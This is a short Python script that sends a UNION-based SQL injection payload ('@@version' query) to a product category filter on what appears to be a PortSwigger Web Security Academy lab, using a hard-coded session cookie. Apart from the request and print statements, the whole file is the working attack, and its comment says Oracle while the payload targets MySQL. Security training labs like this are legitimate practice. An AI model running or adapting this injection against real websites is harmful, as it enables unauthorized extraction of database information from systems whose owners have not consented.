#!/usr/bin/env python3

import urllib.parse
import requests

# SQL injection attack, querying the database type and version on Oracle

link = "https://ac321fbb1e169ac5c0f34b7700d900ef.web-security-academy.net/filter?category=Gifts"

payload={}
headers = {
  'Cookie': 'session=CeFu35Igm87bsS5chNCK9h6NmqLq9S0v'
}

#chunk = "' UNION SELECT NULL,NULL-- " # number of columns, with a space at the end for mysql
chunk = "' UNION SELECT NULL,@@version-- " # Mysql database version
url = link + urllib.parse.quote(chunk)

response = requests.request("GET", url, headers=headers, data=payload)

print(url)
print(response.status_code)
